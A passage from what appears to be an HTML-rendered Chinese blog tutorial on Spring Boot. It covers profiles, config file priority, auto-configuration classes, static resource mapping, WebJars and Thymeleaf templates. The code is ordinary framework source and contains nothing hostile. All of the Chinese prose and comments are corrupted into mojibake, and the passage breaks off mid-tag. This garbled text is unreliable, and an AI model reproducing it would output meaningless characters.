class="hljs-comment">#é€‰æ‹©è¦æ¿€æ´»é‚£ä¸ªç¯å¢ƒå—</span><br><span class="hljs-attr">spring:</span>  <br>  <span class="hljs-attr">profiles:</span>    <br>    <span class="hljs-attr">active:</span> <span class="hljs-string">prod</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">server:</span>  <br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8083</span><br><span class="hljs-attr">spring:</span>  <br>  <span class="hljs-attr">profiles:</span> <span class="hljs-string">dev</span> <span class="hljs-comment">#é…ç½®ç¯å¢ƒçš„åç§°</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-attr">server:</span>  <br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8084</span><br><span class="hljs-attr">spring:</span>  <br>  <span class="hljs-attr">profiles:</span> <span class="hljs-string">prod</span>  <span class="hljs-comment">#é…ç½®ç¯å¢ƒçš„åç§°</span><br></code></pre></td></tr></table></figure><p><strong><font style="color:rgba(0, 0, 0, 0.9);">æ³¨æ„ï¼šå¦‚æœymlå’ŒpropertiesåŒæ—¶éƒ½é…ç½®äº†ç«¯å£ï¼Œå¹¶ä¸”æ²¡æœ‰æ¿€æ´»å…¶ä»–ç¯å¢ƒ ï¼Œ é»˜è®¤ä¼šä½¿ç”¨propertiesé…ç½®æ–‡ä»¶çš„ï¼</font></strong></p><h3 id="é…ç½®æ–‡ä»¶åŠ è½½ä½ç½®"><a href="#é…ç½®æ–‡ä»¶åŠ è½½ä½ç½®" class="headerlink" title="é…ç½®æ–‡ä»¶åŠ è½½ä½ç½®"></a>é…ç½®æ–‡ä»¶åŠ è½½ä½ç½®</h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">å¤–éƒ¨åŠ è½½é…ç½®æ–‡ä»¶çš„æ–¹å¼ååˆ†å¤šï¼Œæˆ‘ä»¬é€‰æ‹©æœ€å¸¸ç”¨çš„å³å¯ï¼Œåœ¨å¼€å‘çš„èµ„æºæ–‡ä»¶ä¸­è¿›è¡Œé…ç½®ï¼</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">springboot å¯åŠ¨ä¼šæ‰«æä»¥ä¸‹ä½ç½®çš„application.propertiesæˆ–è€…application.ymlæ–‡ä»¶ä½œä¸ºSpring bootçš„é»˜è®¤é…ç½®æ–‡ä»¶ï¼š</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">ä¼˜å…ˆçº§1ï¼šé¡¹ç›®è·¯å¾„ä¸‹çš„configæ–‡ä»¶å¤¹é…ç½®æ–‡ä»¶</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">ä¼˜å…ˆçº§2ï¼šé¡¹ç›®è·¯å¾„ä¸‹é…ç½®æ–‡ä»¶</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">ä¼˜å…ˆçº§3ï¼šèµ„æºè·¯å¾„ä¸‹çš„configæ–‡ä»¶å¤¹é…ç½®æ–‡ä»¶</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">ä¼˜å…ˆçº§4ï¼šèµ„æºè·¯å¾„ä¸‹é…ç½®æ–‡ä»¶</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">ä¼˜å…ˆçº§ç”±é«˜åˆ°åº•ï¼Œé«˜ä¼˜å…ˆçº§çš„é…ç½®ä¼šè¦†ç›–ä½ä¼˜å…ˆçº§çš„é…ç½®ï¼›</font></p><h2 id="è‡ªåŠ¨é…ç½®åŸç†"><a href="#è‡ªåŠ¨é…ç½®åŸç†" class="headerlink" title="è‡ªåŠ¨é…ç½®åŸç†"></a>è‡ªåŠ¨é…ç½®åŸç†</h2><p><strong><font style="color:rgba(0, 0, 0, 0.9);">æ¥åˆ° </font></strong><font style="color:rgba(0, 0, 0, 0.9);">META-INF&#x2F;spring.factories<br></font><font style="color:rgba(0, 0, 0, 0.9);">ä»¥å…¶ä¸­çš„ HttpEncodingAutoConfiguration ä¸ºä¾‹åˆ†æ</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">spring.http.  åœ¨é«˜ç‰ˆæœ¬å·²ç»å¼ƒç”¨</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304953.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å£°æ˜è¿™æ˜¯ spring é…ç½®ç±»</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-comment">//å¯ç”¨å¯¹ ServerProperties çš„é…ç½®å±æ€§ç»‘å®šï¼ŒSpring Boot ä¼šæŠŠé…ç½®æ–‡ä»¶ä¸­ server.* çš„å±æ€§ç»‘å®šåˆ° ServerProperties å¯¹è±¡ä¸­</span><br><span class="hljs-meta">@EnableConfigurationProperties(ServerProperties.class)</span><br><span class="hljs-comment">//æ¡ä»¶æ³¨è§£ï¼Œè¡¨ç¤ºæ­¤é…ç½®ç±» ä»…åœ¨ Web åº”ç”¨ä¸”ä½¿ç”¨ Servlet ç±»å‹æ—¶ç”Ÿæ•ˆ</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = ConditionalOnWebApplication.Type.SERVLET)</span><br><span class="hljs-comment">//è¡¨ç¤ºåªæœ‰ç±»è·¯å¾„ä¸­å­˜åœ¨ CharacterEncodingFilter(Spring æä¾›çš„è¿‡æ»¤å™¨ï¼Œç”¨äºè®¾ç½®è¯·æ±‚å’Œå“åº”çš„å­—ç¬¦ç¼–ç ) æ—¶ï¼Œè¿™ä¸ªé…ç½®æ‰ä¼šç”Ÿæ•ˆã€‚</span><br><span class="hljs-meta">@ConditionalOnClass(CharacterEncodingFilter.class)</span><br><span class="hljs-comment">//æ¡ä»¶æ³¨è§£ï¼Œç”¨äºæ£€æŸ¥ é…ç½®æ–‡ä»¶ä¸­æŸä¸ªå±æ€§</span><br><span class="hljs-meta">@ConditionalOnProperty(prefix = &quot;server.servlet.encoding&quot;, value = &quot;enabled&quot;, matchIfMissing = true)</span><br><span class="hljs-comment">//ä» ServerProperties ä¸­æå–ç¼–ç é…ç½®</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpEncodingAutoConfiguration</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Encoding properties;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpEncodingAutoConfiguration</span><span class="hljs-params">(ServerProperties properties)</span> &#123;<br>        <span class="hljs-built_in">this</span>.properties = properties.getServlet().getEncoding();<br>    &#125;<br><br>    <span class="hljs-comment">//å£°æ˜ä¸€ä¸ª Spring Beanï¼Œè¿”å›ç±»å‹ä¸º CharacterEncodingFilter </span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-meta">@ConditionalOnMissingBean</span><br>    <span class="hljs-keyword">public</span> CharacterEncodingFilter <span class="hljs-title function_">characterEncodingFilter</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">CharacterEncodingFilter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderedCharacterEncodingFilter</span>();<br>        filter.setEncoding(<span class="hljs-built_in">this</span>.properties.getCharset().name());<br>        filter.setForceRequestEncoding(<span class="hljs-built_in">this</span>.properties.shouldForce(Encoding.Type.REQUEST));<br>        filter.setForceResponseEncoding(<span class="hljs-built_in">this</span>.properties.shouldForce(Encoding.Type.RESPONSE));<br>        <span class="hljs-keyword">return</span> filter;<br>    &#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› ServerProperties.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;server&quot;, ignoreUnknownFields = true)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServerProperties</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Server HTTP port.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> Integer port;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Network address to which the server should bind.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> InetAddress address;<br><br>    <span class="hljs-meta">@NestedConfigurationProperty</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ErrorProperties</span> <span class="hljs-variable">error</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorProperties</span>();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Strategy for handling X-Forwarded-* headers.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> ForwardHeadersStrategy forwardHeadersStrategy;<br>    ...<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆ yaml ä¸­å¯ä»¥å†™çš„é…ç½®å³ä¸º</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251306965.png"></p><h3 id="å°ç»“ï¼š-2"><a href="#å°ç»“ï¼š-2" class="headerlink" title="å°ç»“ï¼š"></a>å°ç»“ï¼š</h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">xxxxAutoConfigurartionï¼šè‡ªåŠ¨é…ç½®ç±»</font></strong></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">xxxxPropertiesï¼š é…ç½®å±æ€§ç±»  </font></strong></p><p><strong>â€“ debug: true  æŸ¥çœ‹ç”Ÿæ•ˆçš„è‡ªåŠ¨é…ç½®ç±»</strong></p><hr><h1 id="4ã€SpringBoot-Web-å¼€å‘"><a href="#4ã€SpringBoot-Web-å¼€å‘" class="headerlink" title="4ã€SpringBoot Web å¼€å‘"></a>4ã€SpringBoot Web å¼€å‘</h1><h2 id="4-1-é™æ€èµ„æº"><a href="#4-1-é™æ€èµ„æº" class="headerlink" title="4.1 é™æ€èµ„æº"></a>4.1 é™æ€èµ„æº</h2><h3 id="4-1-1-é™æ€èµ„æºæ˜ å°„è§„åˆ™"><a href="#4-1-1-é™æ€èµ„æºæ˜ å°„è§„åˆ™" class="headerlink" title="4.1.1 é™æ€èµ„æºæ˜ å°„è§„åˆ™"></a>4.1.1 é™æ€èµ„æºæ˜ å°„è§„åˆ™</h3><p><font style="color:#080808;background-color:#ffffff;">WebMvcAutoConfiguration -&gt; EnableWebMvcConfiguration -&gt; addResourceHandlers</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandlers</span><span class="hljs-params">(ResourceHandlerRegistry registry)</span> &#123;<br>    <span class="hljs-comment">//resourceProperties.isAddMappings() è¯»å–é™æ€èµ„æºé…ç½®</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.resourceProperties.isAddMappings()) &#123;<br>        logger.debug(<span class="hljs-string">&quot;Default resource handling disabled&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//WebJars æ˜¯ä¸€ç§æŠŠ JSã€CSS æ‰“åŒ…æˆ jar çš„æ–¹å¼ï¼Œè¿™é‡Œè®© /webjars/... ç›´æ¥è®¿é—®åˆ° jar åŒ…é‡Œçš„é™æ€æ–‡ä»¶</span><br>    addResourceHandler(registry, <span class="hljs-string">&quot;/webjars/**&quot;</span>, <span class="hljs-string">&quot;classpath:/META-INF/resources/webjars/&quot;</span>);<br>    <span class="hljs-comment">//æ˜ å°„æ™®é€šé™æ€èµ„æº</span><br>    addResourceHandler(registry, <span class="hljs-built_in">this</span>.mvcProperties.getStaticPathPattern(), (registration) -&gt; &#123;<br>        registration.addResourceLocations(<span class="hljs-built_in">this</span>.resourceProperties.getStaticLocations());<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.servletContext != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ServletContextResource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletContextResource</span>(<span class="hljs-built_in">this</span>.servletContext, SERVLET_LOCATION);<br>            registration.addResourceLocations(resource);<br>        &#125;<br>    &#125;);<br>    &#125;<br>    <span class="hljs-comment">//æä¾›ä¸€ä¸ªæ›´ç®€åŒ–çš„è°ƒç”¨æ–¹å¼ï¼Œåªä¼  URL æ¨¡å¼å’Œç‰©ç†è·¯å¾„ï¼Œä¸éœ€è¦è‡ªå·±å†™ Consumer</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandler</span><span class="hljs-params">(ResourceHandlerRegistry registry, String pattern, String... locations)</span> &#123;<br>        addResourceHandler(registry, pattern, (registration) -&gt; registration.addResourceLocations(locations));<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandler</span><span class="hljs-params">(ResourceHandlerRegistry registry, String pattern,</span><br><span class="hljs-params">                                    Consumer&lt;ResourceHandlerRegistration&gt; customizer)</span> &#123;<br>        <span class="hljs-keyword">if</span> (registry.hasMappingForPattern(pattern)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">ResourceHandlerRegistration</span> <span class="hljs-variable">registration</span> <span class="hljs-operator">=</span> registry.addResourceHandler(pattern);<br>        customizer.accept(registration);<br>        registration.setCachePeriod(getSeconds(<span class="hljs-built_in">this</span>.resourceProperties.getCache().getPeriod()));<br>        registration.setCacheControl(<span class="hljs-built_in">this</span>.resourceProperties.getCache().getCachecontrol().toHttpCacheControl());<br>        registration.setUseLastModified(<span class="hljs-built_in">this</span>.resourceProperties.getCache().isUseLastModified());<br>        customizeResourceHandlerRegistration(registration);<br>    &#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.9);">Webjarsæœ¬è´¨å°±æ˜¯ä»¥jaråŒ…çš„æ–¹å¼å¼•å…¥é™æ€èµ„æº</font></p><p><a href="https://www.webjars.org/">https://www.webjars.org/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jquery<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.9);">è¦ä½¿ç”¨jQueryï¼Œåªè¦è¦å¼•å…¥jQueryå¯¹åº”ç‰ˆæœ¬çš„pomä¾èµ–å³å¯</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);"></font></p><p>å¦ä¸€ç§è§„åˆ™ï¼š<font style="color:rgba(0, 0, 0, 0.9);">&#x2F;**</font></p><p><font style="color:#080808;background-color:#ffffff;">WebProperties -&gt; getStaticLocations -&gt; staticLocations -&gt; CLASSPATH_RESOURCE_LOCATIONS -&gt; </font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">//ä»¥ä¸‹å››ä¸ªç›®å½•å­˜æ”¾çš„é™æ€èµ„æºå¯ä»¥è¢«è¯†åˆ«<br>&quot;classpath:/META-INF/resources/&quot;,<br>&quot;classpath:/resources/&quot;, <br>&quot;classpath:/static/&quot;, <br>&quot;classpath:/public/&quot;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String[] getStaticLocations() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.staticLocations;<br>&#125;<br><br><span class="hljs-keyword">private</span> String[] staticLocations = CLASSPATH_RESOURCE_LOCATIONS;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] CLASSPATH_RESOURCE_LOCATIONS = &#123; <span class="hljs-string">&quot;classpath:/META-INF/resources/&quot;</span>,<br>                                                               <span class="hljs-string">&quot;classpath:/resources/&quot;</span>, <span class="hljs-string">&quot;classpath:/static/&quot;</span>, <span class="hljs-string">&quot;classpath:/public/&quot;</span> &#125;;<br></code></pre></td></tr></table></figure><hr><p>ä¼˜å…ˆçº§ï¼šresources &gt; static &gt; public</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304624.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304716.png"></p><h3 id="4-1-2-é¦–é¡µ"><a href="#4-1-2-é¦–é¡µ" class="headerlink" title="4.1.2 é¦–é¡µ"></a>4.1.2 é¦–é¡µ</h3><p><font style="color:rgba(0, 0, 0, 0.9);">é™æ€èµ„æºæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰ index.html é¡µé¢</font></p><p><font style="color:rgba(0, 0, 0, 0.9);"></font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> WelcomePageHandlerMapping <span class="hljs-title function_">welcomePageHandlerMapping</span><span class="hljs-params">(ApplicationContext applicationContext,</span><br><span class="hljs-params">                                                           FormattingConversionService mvcConversionService, ResourceUrlProvider mvcResourceUrlProvider)</span> &#123;<br>    <span class="hljs-type">WelcomePageHandlerMapping</span> <span class="hljs-variable">welcomePageHandlerMapping</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WelcomePageHandlerMapping</span>(<br>        <span class="hljs-comment">//æ£€æµ‹æ¨¡æ¿å¼•æ“ï¼ˆThymeleafã€Freemarker ç­‰ï¼‰æ˜¯å¦å¯ç”¨ï¼Œä»¥åˆ¤æ–­æ¬¢è¿é¡µæ˜¯æ¨¡æ¿è¿˜æ˜¯é™æ€æ–‡ä»¶</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateAvailabilityProviders</span>(applicationContext), <br>        <span class="hljs-comment">//æŸ¥æ‰¾æ¨¡æ¿ã€é™æ€æ–‡ä»¶</span><br>        applicationContext, <br>        <span class="hljs-comment">//æŸ¥æ‰¾å®é™…çš„æ¬¢è¿é¡µèµ„æº</span><br>        getWelcomePage(),<br>        <span class="hljs-comment">//æ¬¢è¿é¡µåŒ¹é…è·¯å¾„æ¨¡å¼</span><br>        <span class="hljs-built_in">this</span>.mvcProperties.getStaticPathPattern()<br>    );<br>    <span class="hljs-comment">//è®¾ç½®æ‹¦æˆªå™¨</span><br>    welcomePageHandlerMapping.setInterceptors(<br>        getInterceptors(mvcConversionService, mvcResourceUrlProvider)<br>    );<br>    <span class="hljs-comment">//è®¾ç½® CORS</span><br>    welcomePageHandlerMapping.setCorsConfigurations(<br>        getCorsConfigurations()<br>    );<br>    <span class="hljs-keyword">return</span> welcomePageHandlerMapping;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› getWelcomePage()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Resource <span class="hljs-title function_">getWelcomePage</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//éå†é™æ€èµ„æºä½ç½®</span><br>    <span class="hljs-keyword">for</span> (String location : <span class="hljs-built_in">this</span>.resourceProperties.getStaticLocations()) &#123;<br>        <span class="hljs-type">Resource</span> <span class="hljs-variable">indexHtml</span> <span class="hljs-operator">=</span> getIndexHtml(location);<br>        <span class="hljs-keyword">if</span> (indexHtml != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> indexHtml;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//æ£€æŸ¥ ServletContext ä¸‹çš„æ¬¢è¿é¡µ</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> getServletContext();<br>    <span class="hljs-keyword">if</span> (servletContext != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> getIndexHtml(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletContextResource</span>(servletContext, SERVLET_LOCATION));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-Thymeleafæ¨¡æ¿å¼•æ“"><a href="#4-2-Thymeleafæ¨¡æ¿å¼•æ“" class="headerlink" title="4.2 Thymeleafæ¨¡æ¿å¼•æ“"></a>4.2 <font style="color:rgba(0, 0, 0, 0.9);">Thymeleafæ¨¡æ¿å¼•æ“</font></h2><p><a href="https://www.thymeleaf.org/">https://www.thymeleaf.org/</a></p><p><a href="https://github.com/thymeleaf/thymeleaf">https://github.com/thymeleaf/thymeleaf</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304509.png"></p><p>å¼•å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--thymeleaf--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.9);">Thymeleafçš„è‡ªåŠ¨é…ç½®ç±»ï¼šThymeleafProperties</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;spring.thymeleaf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThymeleafProperties</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Charset</span> <span class="hljs-variable">DEFAULT_ENCODING</span> <span class="hljs-operator">=</span> StandardCharsets.UTF_8;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;classpath:/templates/&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SUFFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.html&quot;</span>;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆåªè¦åœ¨ templates ä¸­å†™ .html é¡µé¢å°±å¯ä»¥å®Œæˆ <font style="color:rgba(0, 0, 0, 0.9);">Thymeleaf æ¨¡æ¿</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-comment">// åœ¨ templates ç›®å½•ä¸‹çš„æ‰€æœ‰é¡µé¢ï¼Œåªèƒ½é€šè¿‡ controller æ¥è·³è½¬</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>test<span 